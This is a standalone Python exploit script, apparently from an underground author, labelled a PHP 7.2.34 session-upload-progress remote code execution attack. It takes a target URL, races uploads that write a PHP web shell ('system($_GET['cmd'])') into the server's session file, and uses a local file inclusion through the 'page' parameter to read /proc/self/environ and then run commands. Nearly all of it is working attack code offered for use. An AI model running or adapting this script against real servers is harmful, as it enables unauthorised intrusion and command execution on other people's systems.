#!/usr/bin/env python
# PHP 7.2.34 RCE | @spyizxa_0day
# Telegram: @siberdirenis

import requests 
import threading
import time
import re
import base64

def banner():
    print('''
──────────────────────────────────────────────────────────────────────────────────────────────────
─██████████████─██████──██████─██████████████────████████████████───██████████████─██████████████─
─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██────██░░░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░██████░░██─██░░██──██░░██─██░░██████░░██────██░░████████░░██───██░░██████████─██░░██████████─
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██────██░░██────██░░██───██░░██─────────██░░██─────────
─██░░██████░░██─██░░██████░░██─██░░██████░░██────██░░████████░░██───██░░██─────────██░░██████████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██────██░░░░░░░░░░░░██───██░░██─────────██░░░░░░░░░░██─
─██░░██████████─██░░██████░░██─██░░██████████────██░░██████░░████───██░░██─────────██░░██████████─
─██░░██─────────██░░██──██░░██─██░░██────────────██░░██──██░░██─────██░░██─────────██░░██─────────
─██░░██████████─██░░██──██░░██─██░░██────────────██░░██──██░░██████─██░░██████████─██░░██████████─
─██░░██─────────██░░██──██░░██─██░░██────────────██░░██──██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██████─────────██████──██████─██████────────────██████──██████████─██████████████─██████████████─
──────────────────────────────────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████████████─████████──████████─██████████████─██████─────────██████████████─██████████─██████████████─
─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██─────────██░░██████░░██─████░░████─██████░░██████─
─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██─────────██░░██──██░░██───██░░██───────██░░██─────
─██░░██████████───████░░░░░░████───██░░██████░░██─██░░██─────────██░░██──██░░██───██░░██───────██░░██─────
─██░░░░░░░░░░██─────██░░░░░░██─────██░░░░░░░░░░██─██░░██─────────██░░██──██░░██───██░░██───────██░░██─────
─██░░██████████───████░░░░░░████───██░░██████████─██░░██─────────██░░██──██░░██───██░░██───────██░░██─────
─██░░██───────────██░░░░██░░░░██───██░░██─────────██░░██─────────██░░██──██░░██───██░░██───────██░░██─────
─██░░██████████─████░░██──██░░████─██░░██─────────██░░██████████─██░░██████░░██─████░░████─────██░░██─────
─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░██─────────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─────██░░██─────
─██████████████─████████──████████─██████─────────██████████████─██████████████─██████████─────██████─────
──────────────────────────────────────────────────────────────────────────────────────────────────────────
          
    [+] PHP 7.2.34 Session Upload Progress RCE
    [+] Coded by @spyizxa_0day
          [+] Telegram: @siberdirenis
    ''')
banner()
URL = input('[+] please enter URL: ').strip()
if not URL.endswith('/'):
    URL += '/'
PAYLOAD = "<?php system($_GET['cmd']); ?>"
print('[+] Exploit Starting...')

try:
    session = requests.Session()
    print('[*] Connecting to target...')
    r = session.get(URL, timeout=10)
    if '<form' not in r.text.lower() or 'multipart' not in r.text.lower():
        print("[-] No upload form! <form enctype='multipart/form-data'> required!")
        time.sleep(5)
        exit()
    print("[*] Upload formu bulundu → session başlatılıyor...")
    session.post(URL, data={'PHP_SESSION_UPLOAD_PROGRESS': 'init'}, timeout=10)

    cookies = session.cookies.get_dict()
    if 'PHPSESSID' not in cookies:
        print('[-] PHPSESSID could not be retrieved')
        time.sleep(5)
        exit()

    sessid = cookies['PHPSESSID']
    print(f'[+] PHPSESSID: {sessid}')

    def get_session_path():
            try:
                filter_url = f"{URL}?page=php://filter/convert.base64-encode/resource=/proc/self/environ"
                r = session.get(filter_url, timeout=10)
                match = re.search(r'AAAA(.*?)====', r.text, re.DOTALL)
                if match:
                    env = base64.b64decode(match.group(1) + '===').decode('utf-8', errors='ignore')
                    path_match = re.search(r'PHP_SESSION_SAVE_PATH=(.*?);', env)
                    if path_match:
                        path = path_match.group(1)
                        print(f"[+] Session path found: {path}")
                        return path
            except: pass
            print("[!] Session path not found → using default")
            return "/var/lib/php/sessions"

    def payload_upload():
        files = {'file': ('spyizxa.txt', 'A' * 100000)}
        data = {'PHP_SESSION_UPLOAD_PROGRESS': PAYLOAD}
        print('[+] Writing payload to session file...')
        while True:
            try:
                session.post(URL, files=files, data=data, timeout=3)
            except:
                break

    def lfitorce():
        time.sleep(6) # wait for upload
        session_path = get_session_path()
        session_file = f"{session_path}/sess_{sessid}"
        rce_url = f"{URL}?page={session_file}&cmd=whoami"
        print(f'[+] RCE URL: {rce_url}')
        try:
            r = session.get(rce_url, timeout=10)
            output = r.text.strip()
            if 'www-data' in output or 'apache' in output or len(output) < 1000:
                print('[+] RCE SUCCESSFUL!')
                print(f"[+] Output: {output}")
            else:
                print("[-] LFI is present but RCE is not present. Session file was not created.")
        except Exception as e:
                print(f'[-] RCE Failed: {e}')

    threading.Thread(target=payload_upload, daemon=True).start()
    lfitorce()

except requests.exceptions.Timeout:
    print('[-] Connection timeout!')
except requests.exceptions.ConnectionError:
    print(f'[-] Connection problem')
except KeyboardInterrupt:
    print('\n[-] Exploit Stop')
except Exception as e:
    print(f'[-] Unexpected error: {e}')